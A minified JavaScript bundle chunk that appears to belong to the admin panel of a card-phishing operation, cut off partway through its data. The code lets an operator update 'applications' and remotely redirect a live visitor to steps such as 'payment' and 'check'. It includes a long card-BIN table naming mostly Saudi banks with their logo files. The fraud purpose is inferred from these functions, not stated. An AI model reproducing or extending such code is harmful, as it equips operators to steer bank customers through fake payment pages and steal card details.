(globalThis.TURBOPACK || (globalThis.TURBOPACK = [])).push(["object" == typeof document ? document.currentScript : void 0, 31713, e => {
    "use strict";
    e.i(47167);
    var t = e.i(43476),
        a = e.i(71645),
        r = e.i(54858),
        n = e.i(62198);
    let s = async (t, a) => {
        await (0, r.updateApplication)(t, a);
        try {
            (0, n.adminUpdateVisitor)(t, a);
            let e = a.redirectPage || a.redirect_page || a.currentPage || a.current_page;
            e && "null" !== e && (0, n.adminRedirectVisitor)(t, e)
        } catch (e) {}
    }, i = async e => (0, r.getApplication)(e), o = async e => {
        await (0, r.deleteMultipleApplications)(e)
    }, d = e => {
        let t = e.replace(/^([A-Z])|[\s-_]+(\w)/g, (e, t, a) => a ? a.toUpperCase() : t.toLowerCase());
        return t.charAt(0).toUpperCase() + t.slice(1)
    }, l = (...e) => e.filter((e, t, a) => !!e && "" !== e.trim() && a.indexOf(e) === t).join(" ").trim(), pageDisplay = e => {
        let t = e?.redirectPage || e?.redirect_page,
            a = e?.currentPage || e?.current_page,
            r = e?.currentStep || e?.current_step,
            n = ["check", "payment", "_st1", "4", 4];
        if (t && "null" !== t) return t;
        if (r && !n.includes(r) && !n.includes(Number(r))) return r;
        return a || r || "home"
    }, redirectPayload = (e, t = {}) => {
        let a = "home" === e ? "home-new" : e;
        return {
            redirectPage: a,
            currentPage: a,
            currentStep: a,
            ...t
        }
    }, updateHistoryEntry = (e, t, a, r) => {
        if (!Array.isArray(e)) return [];
        let n = -1;
        if (t && "current" !== t && e.some(e => e.id === t)) n = e.findIndex(e => e.id === t);
        else {
            let s = e.map((e, t) => ({
                entry: e,
                index: t
            })).filter(({
                entry: e
            }) => a.includes(e.type));
            if ("current" === t || !e.some(e => e.id === t)) s.length && (n = s[s.length - 1].index);
            else {
                let e = parseInt(t, 10);
                !isNaN(e) && s[e] && (n = s[e].index)
            }
        }
        return n < 0 ? e : e.map((e, t) => t === n ? {
            ...e,
            status: r
        } : e)
    };
    var c = {
        xmlns: "http://www.w3.org/2000/svg",
        width: 24,
        height: 24,
        viewBox: "0 0 24 24",
        fill: "none",
        stroke: "currentColor",
        strokeWidth: 2,
        strokeLinecap: "round",
        strokeLinejoin: "round"
    };
    let u = (0, a.forwardRef)(({
            color: e = "currentColor",
            size: t = 24,
            strokeWidth: r = 2,
            absoluteStrokeWidth: n,
            className: s = "",
            children: i,
            iconNode: o,
            ...d
        }, u) => (0, a.createElement)("svg", {
            ref: u,
            ...c,
            width: t,
            height: t,
            stroke: e,
            strokeWidth: n ? 24 * Number(r) / Number(t) : r,
            className: l("lucide", s),
            ...!i && !(e => {
                for (let t in e)
                    if (t.startsWith("aria-") || "role" === t || "title" === t) return !0
            })(d) && {
                "aria-hidden": "true"
            },
            ...d
        }, [...o.map(([e, t]) => (0, a.createElement)(e, t)), ...Array.isArray(i) ? i : [i]])),
        m = (e, t) => {
            let r = (0, a.forwardRef)(({
                className: r,
                ...n
            }, s) => (0, a.createElement)(u, {
                ref: s,
                iconNode: t,
                className: l(`lucide-${d(e).replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase()}`, `lucide-${e}`, r),
                ...n
            }));
            return r.displayName = d(e), r
        },
        p = m("search", [
            ["path", {
                d: "m21 21-4.34-4.34",
                key: "14j7rj"
            }],
            ["circle", {
                cx: "11",
                cy: "11",
                r: "8",
                key: "4ej97u"
            }]
        ]),
        g = m("trash-2", [
            ["path", {
                d: "M10 11v6",
                key: "nco0om"
            }],
            ["path", {
                d: "M14 11v6",
                key: "outv1u"
            }],
            ["path", {
                d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",
                key: "miytrc"
            }],
            ["path", {
                d: "M3 6h18",
                key: "d0wm0j"
            }],
            ["path", {
                d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",
                key: "e791ji"
            }]
        ]),
        h = m("square-check-big", [
            ["path", {
                d: "M21 10.656V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h12.344",
                key: "2acyp4"
            }],
            ["path", {
                d: "m9 11 3 3L22 4",
                key: "1pflzl"
            }]
        ]),
        b = m("square", [
            ["rect", {
                width: "18",
                height: "18",
                x: "3",
                y: "3",
                rx: "2",
                key: "afitv7"
            }]
        ]),
        x = m("credit-card", [
            ["rect", {
                width: "20",
                height: "14",
                x: "2",
                y: "5",
                rx: "2",
                key: "ynyp8z"
            }],
            ["line", {
                x1: "2",
                x2: "22",
                y1: "10",
                y2: "10",
                key: "1b3vmo"
            }]
        ]),
        f = m("key-round", [
            ["path", {
                d: "M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z",
                key: "1s6t7t"
            }],
            ["circle", {
                cx: "16.5",
                cy: "7.5",
                r: ".5",
                fill: "currentColor",
                key: "w0ekpg"
            }]
        ]),
        y = m("refresh-cw", [
            ["path", {
                d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",
                key: "v9h5vc"
            }],
            ["path", {
                d: "M21 3v5h-5",
                key: "1q7to0"
            }],
            ["path", {
                d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",
                key: "3uifl3"
            }],
            ["path", {
                d: "M8 16H3v5",
                key: "1cv678"
            }]
        ]),
        v = {
            223379: {
                bin: "223379",
                scheme: "mastercard",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum Flex",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            533964: {
                bin: "533964",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "WORLD ELITE",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            400949: {
                bin: "400949",
                scheme: "visa",
                funding: "credit",
                issuer_name: "M AND I BANK OF SOUTHERN WISCONSIN",
                product_name: null,
                issuer_logo: null,
                country_code: "US"
            },
            403996: {
                bin: "403996",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Albilad",
                product_name: "Signature",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            481206: {
                bin: "481206",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Albilad",
                product_name: "PLATINUM",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            402667: {
                bin: "402667",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Albilad",
                product_name: "Signature",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            401978: {
                bin: "401978",
                scheme: "visa",
                funding: "debit",
                issuer_name: "BANQUE SAUDI FRANSI",
                product_name: "PREPAID",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            401883: {
                bin: "401883",
                scheme: "visa",
                funding: "credit",
                issuer_name: "BANQUE SAUDI FRANSI",
                product_name: "SIGNATURE",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            409201: {
                bin: "409201",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            458456: {
                bin: "458456",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "INFINITE",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            455708: {
                bin: "455708",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "PREPAID",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            410621: {
                bin: "410621",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Business Enhanced",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            410683: {
                bin: "410683",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Emirates NBD",
                product_name: "Platinum",
                issuer_logo: "emirates-nbd-bank-pjsc.png",
                country_code: "SA"
            },
            458263: {
                bin: "458263",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Emirates NBD",
                product_name: "INFINITE",
                issuer_logo: "emirates-nbd-bank-pjsc.png",
                country_code: "SA"
            },
            410684: {
                bin: "410684",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Emirates NBD",
                product_name: "Platinum",
                issuer_logo: "emirates-nbd-bank-pjsc.png",
                country_code: "SA"
            },
            410685: {
                bin: "410685",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Emirates NBD",
                product_name: "Classic",
                issuer_logo: "emirates-nbd-bank-pjsc.png",
                country_code: "SA"
            },
            414627: {
                bin: "414627",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            416042: {
                bin: "416042",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Riyad Bank",
                product_name: "Signature",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            541802: {
                bin: "541802",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Riyad Bank",
                product_name: "WORLD",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            416634: {
                bin: "416634",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Classic",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            417323: {
                bin: "417323",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            420132: {
                bin: "420132",
                scheme: "mada",
                funding: "debit",
                issuer_name: "STC Pay",
                product_name: "Visa",
                issuer_logo: "stc-bank.png",
                country_code: "SA"
            },
            422222: {
                bin: "422222",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Vision Bank",
                product_name: "Classic",
                issuer_logo: "vision-bank.webp",
                country_code: "SA"
            },
            422689: {
                bin: "422689",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Infinite",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            422818: {
                bin: "422818",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Rewards",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            422819: {
                bin: "422819",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Rewards",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            424242: {
                bin: "424242",
                scheme: "visa",
                funding: "credit",
                issuer_name: "JPMORGAN CHASE BANK NA",
                product_name: null,
                issuer_logo: null,
                country_code: "US"
            },
            426362: {
                bin: "426362",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Ultra High Net Worth",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            427222: {
                bin: "427222",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Signature",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            428331: {
                bin: "428331",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi British Bank",
                product_name: "Visa",
                issuer_logo: "saudi-british-bank.png",
                country_code: "SA"
            },
            456891: {
                bin: "456891",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Saudi British Bank",
                product_name: "PLATINUM",
                issuer_logo: "saudi-british-bank.png",
                country_code: "SA"
            },
            428335: {
                bin: "428335",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Bank Albilad",
                product_name: "Prepaid",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            428671: {
                bin: "428671",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Alinma Bank",
                product_name: "Gold",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            446672: {
                bin: "446672",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Alinma Bank",
                product_name: "SIGNATURE",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            428672: {
                bin: "428672",
                scheme: "mada",
                funding: "debit",
                issuer_name: "INMA Bank",
                product_name: "Visa",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            428679: {
                bin: "428679",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Alinma Bank",
                product_name: "Platinum",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            429927: {
                bin: "429927",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Prepaid Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            430258: {
                bin: "430258",
                scheme: "visa",
                funding: "unknown",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            523968: {
                bin: "523968",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "TITANIUM",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            430259: {
                bin: "430259",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "Infinite",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            432159: {
                bin: "432159",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Infinite",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            455739: {
                bin: "455739",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "PLATINUM",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            432328: {
                bin: "432328",
                scheme: "mada",
                funding: "debit",
                issuer_name: "INMA Bank",
                product_name: "Visa",
                issuer_logo: null,
                country_code: "SA"
            },
            412565: {
                bin: "412565",
                scheme: "visa",
                funding: "debit",
                issuer_name: "INMA Bank",
                product_name: "Visa",
                issuer_logo: null,
                country_code: "SA"
            },
            433786: {
                bin: "433786",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Platinum",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            435240: {
                bin: "435240",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Arab National Bank",
                product_name: "Platinum",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            437974: {
                bin: "437974",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Platinum",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            489319: {
                bin: "489319",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Bank Aljazira",
                product_name: "PLATINUM",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            401758: {
                bin: "401758",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Bank Aljazira",
                product_name: "PREPAID PLATINUM",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            473827: {
                bin: "473827",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "INFINITE",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            411092: {
                bin: "411092",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "PLATINUM",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            440532: {
                bin: "440532",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "Platinum",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            440533: {
                bin: "440533",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Bank Aljazira",
                product_name: "Classic",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            440647: {
                bin: "440647",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Classic",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            440795: {
                bin: "440795",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Business",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            442463: {
                bin: "442463",
                scheme: "visa",
                funding: "debit",
                issuer_name: "PJSC BANK KYIVSKA RUS",
                product_name: "Classic",
                issuer_logo: null,
                country_code: "UA"
            },
            445520: {
                bin: "445520",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Signature",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            484166: {
                bin: "484166",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "BUSINESS ENHANCED",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            418347: {
                bin: "418347",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Al Rajhi Bank",
                product_name: "IMKAN",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            445521: {
                bin: "445521",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Infinite",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            445687: {
                bin: "445687",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Bank Albilad",
                product_name: "Prepaid Platinum",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            445827: {
                bin: "445827",
                scheme: "visa",
                funding: "debit",
                issuer_name: "AL RAJHI BANKING AND INVESTMENT CORP.",
                product_name: "Prepaid",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            403027: {
                bin: "403027",
                scheme: "visa",
                funding: "debit",
                issuer_name: "AL RAJHI BANKING AND INVESTMENT CORP.",
                product_name: "Prepaid",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            539951: {
                bin: "539951",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "FIRST ABU DHABI BANK PJSC",
                product_name: "PLATINUM",
                issuer_logo: null,
                country_code: "SA"
            },
            446393: {
                bin: "446393",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Bilad Bank",
                product_name: "Visa",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            428334: {
                bin: "428334",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Al Bilad Bank",
                product_name: "PREPAID",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            446404: {
                bin: "446404",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Bank Al Saudi Al Fransi",
                product_name: "Visa",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            538135: {
                bin: "538135",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Al Bank Al Saudi Al Fransi",
                product_name: "PLATINUM",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            446914: {
                bin: "446914",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "Platinum",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            428375: {
                bin: "428375",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "PLATINUM",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            428374: {
                bin: "428374",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "PLATINUM",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            450824: {
                bin: "450824",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Rewards",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            454683: {
                bin: "454683",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Riyad Bank",
                product_name: "Signature",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            454684: {
                bin: "454684",
                scheme: "visa",
                funding: "credit",
                issuer_name: "RIYAD BANK",
                product_name: "Classic",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            454887: {
                bin: "454887",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Barraq Finance Company",
                product_name: null,
                issuer_logo: null,
                country_code: "SA"
            },
            455036: {
                bin: "455036",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Arab National Bank",
                product_name: "Classic",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            455740: {
                bin: "455740",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Classic",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            456893: {
                bin: "456893",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Platinum",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            456933: {
                bin: "456933",
                scheme: "visa",
                funding: "debit",
                issuer_name: "TELLER, A.S.",
                product_name: "Business",
                issuer_logo: null,
                country_code: "NO"
            },
            457865: {
                bin: "457865",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Platinum",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            457927: {
                bin: "457927",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Riyad Bank",
                product_name: "Prepaid Classic",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            457998: {
                bin: "457998",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Alinma Bank",
                product_name: "Platinum",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            459588: {
                bin: "459588",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Infinite",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            462220: {
                bin: "462220",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Rajhi Banking and Inv. Corp.",
                product_name: "Visa",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            467323: {
                bin: "467323",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            468540: {
                bin: "468540",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Bank Albilad",
                product_name: "Classic",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            468541: {
                bin: "468541",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Bank Albilad",
                product_name: "Classic",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            468543: {
                bin: "468543",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Bilad Bank",
                product_name: "Visa",
                issuer_logo: "bank-albilad.png",
                country_code: "SA"
            },
            474883: {
                bin: "474883",
                scheme: "visa",
                funding: "debit",
                issuer_name: "BANK OF OKLAHOMA, N.A.",
                product_name: "Classic",
                issuer_logo: null,
                country_code: "US"
            },
            475558: {
                bin: "475558",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Signature",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            476328: {
                bin: "476328",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Arab National Bank",
                product_name: "Infinite",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            477983: {
                bin: "477983",
                scheme: "visa",
                funding: "credit",
                issuer_name: "SAMBA FINANCIAL GROUP",
                product_name: null,
                issuer_logo: null,
                country_code: "SA"
            },
            478295: {
                bin: "478295",
                scheme: "visa",
                funding: "debit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "Prepaid Platinum",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            483012: {
                bin: "483012",
                scheme: "visa",
                funding: "debit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "INFINITE",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            457842: {
                bin: "457842",
                scheme: "visa",
                funding: "credit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "PLATINUM",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            478296: {
                bin: "478296",
                scheme: "visa",
                funding: "debit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "Prepaid Platinum",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            483010: {
                bin: "483010",
                scheme: "mada",
                funding: "debit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "Classic",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            483011: {
                bin: "483011",
                scheme: "mada",
                funding: "debit",
                issuer_name: "The Saudi Investment Bank",
                product_name: "Platinum",
                issuer_logo: "the-saudi-investment-bank.png",
                country_code: "SA"
            },
            483115: {
                bin: "483115",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Al Rajhi Bank",
                product_name: "Platinum",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            483432: {
                bin: "483432",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Alinma Bank",
                product_name: "Platinum",
                issuer_logo: "alinma-bank.png",
                country_code: "SA"
            },
            484783: {
                bin: "484783",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Al Rajhi Banking and Inv. Corp.",
                product_name: "Visa",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            486094: {
                bin: "486094",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Arab National Bank",
                product_name: "Gold",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            486095: {
                bin: "486095",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Arab National Bank",
                product_name: "Platinum",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            488306: {
                bin: "488306",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Unknown Bank",
                product_name: null,
                issuer_logo: null,
                country_code: "US"
            },
            489022: {
                bin: "489022",
                scheme: "visa",
                funding: "debit",
                issuer_name: "Unknown Bank",
                product_name: null,
                issuer_logo: null,
                country_code: "KZ"
            },
            489318: {
                bin: "489318",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Bank Aljazira",
                product_name: "Reward",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            489671: {
                bin: "489671",
                scheme: "visa",
                funding: "credit",
                issuer_name: "STC Bank",
                product_name: "Business Enhanced",
                issuer_logo: "stc-bank.png",
                country_code: "SA"
            },
            489674: {
                bin: "489674",
                scheme: "visa",
                funding: "credit",
                issuer_name: "STC Bank",
                product_name: "Signature Business",
                issuer_logo: "stc-bank.png",
                country_code: "SA"
            },
            490980: {
                bin: "490980",
                scheme: "visa",
                funding: "debit",
                issuer_name: "AL RAJHI BANKING AND INVESTMENT CORP.",
                product_name: "Electron",
                issuer_logo: "al-rajhi-banking-and-investment-corp.png",
                country_code: "SA"
            },
            496655: {
                bin: "496655",
                scheme: "visa",
                funding: "credit",
                issuer_name: "Banque Saudi Fransi",
                product_name: "Rewards",
                issuer_logo: "banque-saudi-fransi.png",
                country_code: "SA"
            },
            512060: {
                bin: "512060",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "World",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            512220: {
                bin: "512220",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "World",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            516138: {
                bin: "516138",
                scheme: "mastercard",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "STANDARD",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            518694: {
                bin: "518694",
                scheme: "mastercard",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum Travel",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            520058: {
                bin: "520058",
                scheme: "mada",
                funding: "credit",
                issuer_name: "Riyadh Bank",
                product_name: "Mastercard",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            520090: {
                bin: "520090",
                scheme: "mastercard",
                funding: "debit",
                issuer_name: "Riyad Bank",
                product_name: "Standard",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            523691: {
                bin: "523691",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "BANKAOOL S.A. INSTITUCION DE",
                product_name: "Standard",
                issuer_logo: null,
                country_code: "MX"
            },
            524130: {
                bin: "524130",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Nebula Super Premium",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            524197: {
                bin: "524197",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            524236: {
                bin: "524236",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Bank Aljazira",
                product_name: "Platinum",
                issuer_logo: "bank-aljazira.png",
                country_code: "SA"
            },
            524514: {
                bin: "524514",
                scheme: "mada",
